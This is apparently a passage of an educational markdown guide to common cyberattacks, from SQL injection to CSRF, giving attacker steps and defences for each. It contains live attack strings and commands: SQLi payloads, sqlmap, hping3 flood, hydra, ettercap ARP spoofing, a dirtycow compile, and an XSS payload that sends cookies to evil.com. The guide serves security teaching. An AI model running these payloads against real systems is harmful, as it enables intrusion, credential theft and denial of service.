# Top 25 Cyber Attacks: Offensive and Defensive Perspectives

This guide provides an in-depth explanation of 25 common cyberattacks from both the **offensive** (how attackers perform the attack) and **defensive** (how to defend against it) perspectives. Each attack includes practical steps and the corresponding defensive strategies to protect against these threats.

## **1. SQL Injection (SQLi)**

### Offensive Side (How to Hack):
- **Objective**: Exploit poorly written SQL queries by injecting malicious SQL code into input fields.
- **Steps**:
  1. Identify a vulnerable website by entering `'` in input fields to cause errors.
  2. Inject SQL payload to bypass login forms:
     ```sql
     ' OR 1=1 --
     ```
  3. Extract data:
     ```sql
     ' UNION SELECT username, password FROM users --
     ```
  4. Use tools like **sqlmap** to automate SQL injection:
     ```bash
     sqlmap -u "http://example.com/login.php?id=1" --dbs
     ```

### Defensive Side (How to Defend):
- **Input Validation**: Sanitize inputs to block special characters like `'` or `--`.
- **Parameterized Queries**: Use prepared statements with parameterized queries to avoid direct SQL execution.
- **WAF**: Web Application Firewalls such as **ModSecurity** can help block SQLi attempts.

## **2. Cross-Site Scripting (XSS)**

### Offensive Side (How to Hack):
- **Objective**: Inject malicious JavaScript into web applications to steal cookies, deface websites, or redirect users.
- **Steps**:
  1. Identify an input field (search bar, comment box) that reflects user input.
  2. Inject malicious script:
     ```html
     <script>alert('XSS Attack!');</script>
     ```
  3. Exploit XSS with more complex payloads for cookie theft:
     ```html
     <script>document.write('<img src="http://evil.com/steal.php?cookie='+document.cookie+'" />');</script>
     ```

### Defensive Side (How to Defend):
- **Input Sanitization**: Filter out or escape special characters like `<`, `>`, `&`, and `'`.
- **Output Encoding**: Encode outputs so that input is treated as text, not code.
- **CSP**: Implement Content Security Policies to restrict script execution.

## **3. Phishing**

### Offensive Side (How to Hack):
- **Objective**: Trick users into revealing sensitive information (login credentials, financial data).
- **Steps**:
  1. Create a phishing website that mimics a legitimate service.
  2. Craft a phishing email with a link to the fake website.
     ```html
     <a href="http://fakebank.com/login">Login here</a>
     ```
  3. Harvest credentials when the victim enters their details on the fake page.

### Defensive Side (How to Defend):
- **User Training**: Train employees to spot phishing emails (e.g., check URLs, sender details).
- **Anti-Phishing Tools**: Use browser-based anti-phishing tools and email filters to block phishing emails.
- **MFA**: Use multi-factor authentication so that stolen credentials alone cannot be used to access accounts.

## **4. Distributed Denial of Service (DDoS)**

### Offensive Side (How to Hack):
- **Objective**: Overwhelm a target system or network with a flood of traffic, making it unavailable to legitimate users.
- **Steps**:
  1. Use botnets or tools like **LOIC** (Low Orbit Ion Cannon) to flood the target with traffic.
  2. Generate a flood of requests:
     ```bash
     hping3 -S --flood -V <target_IP>
     ```

### Defensive Side (How to Defend):
- **Rate Limiting**: Limit the number of requests allowed per IP address to prevent overload.
- **DDoS Protection Services**: Use cloud-based services like **Cloudflare** or **Akamai** for DDoS mitigation.
- **Traffic Filtering**: Deploy firewalls or Intrusion Prevention Systems (IPS) to block malicious traffic.

## **5. Brute Force Attacks**

### Offensive Side (How to Hack):
- **Objective**: Guess a userâ€™s password by trying multiple combinations.
- **Steps**:
  1. Use tools like **Hydra** or **John the Ripper** to brute force SSH or web login.
     ```bash
     hydra -l username -P password_list.txt ssh://target_ip
     ```
  2. Continue until the correct password is found.

### Defensive Side (How to Defend):
- **Account Lockout**: Lock accounts after several failed login attempts.
- **Strong Password Policies**: Require complex passwords with upper and lower case letters, numbers, and special characters.
- **MFA**: Use multi-factor authentication for an extra layer of security.

---

## **6. Credential Stuffing**

### Offensive Side (How to Hack):
- **Objective**: Use stolen username and password combinations from one service to access another service.
- **Steps**:
  1. Obtain a leaked password database from the dark web.
  2. Use tools like **Snipr** to automate login attempts with stolen credentials on other sites.

### Defensive Side (How to Defend):
- **MFA**: Prevent access even if passwords are leaked by requiring a second authentication factor.
- **Monitor for Unusual Activity**: Implement tools that detect logins from unusual locations or devices.
- **Password Hashing**: Ensure passwords are hashed and salted before storage, so they are harder to reverse-engineer.

## **7. Man-in-the-Middle (MITM) Attack**

### Offensive Side (How to Hack):
- **Objective**: Intercept communication between two parties to steal information or alter data.
- **Steps**:
  1. Use tools like **Ettercap** or **Wireshark** to capture network traffic.
     ```bash
     ettercap -T -q -M arp:remote /victim_ip/ /gateway_ip/
     ```
  2. Eavesdrop on sensitive information such as passwords or financial details.

### Defensive Side (How to Defend):
- **Use HTTPS**: Encrypt all communications with SSL/TLS to prevent interception.
- **VPN**: Use Virtual Private Networks (VPNs) to create encrypted tunnels.
- **Network Segmentation**: Segment internal networks to limit exposure to attackers.

## **8. Ransomware**

### Offensive Side (How to Hack):
- **Objective**: Encrypt a victim's files and demand a ransom to unlock them.
- **Steps**:
  1. Deliver ransomware through phishing emails, malicious attachments, or compromised websites.
  2. Use ransomware tools like **WannaCry** or **Locky** to encrypt the victim's files.

### Defensive Side (How to Defend):
- **Backup and Recovery**: Regularly back up critical data and store backups offline.
- **Antivirus and Endpoint Protection**: Use updated antivirus software with real-time protection to detect and block ransomware.
- **Patch Management**: Apply security patches to operating systems and applications to close vulnerabilities used by ransomware.

---

## **9. Privilege Escalation**

### Offensive Side (How to Hack):
- **Objective**: Gain higher-level privileges on a system (e.g., from user to root/admin).
- **Steps**:
  1. Use a local privilege escalation exploit (e.g., **dirtycow** on Linux) to gain root access.
     ```bash
     gcc -pthread exploit.c -o dirtycow
     ./dirtycow
     ```

### Defensive Side (How to Defend):
- **Patch Vulnerabilities**: Regularly apply patches to fix known privilege escalation bugs.
- **Least Privilege Access**: Implement the principle of least privilege, ensuring users only have the permissions they need.
- **Monitor Logs**: Watch for suspicious activity such as attempts to access administrative functions.

## **10. Cross-Site Request Forgery (CSRF)**

### Offensive Side (How to Hack):
- **Objective**: Trick a user into performing an action (e.g., changing settings or transferring money) without their consent.
- **Steps**:
  1. Create a malicious link that performs a sensitive action:
     ```html
     <img src="http://bank.com/transfer?amount=1000&to_account=12345">
     ```
  2. Trick the user into visiting the link.

### Defensive Side (How to Defend):
- **CSRF Tokens**: Use CSRF tokens to validate each request and ensure it originates from a legitimate source.
- **Same-Site Cookies**: Use the `SameSite` cookie attribute to restrict cross-origin requests.
- **CAPTCHA**: Add CAPTCHA challenges for sensitive actions.
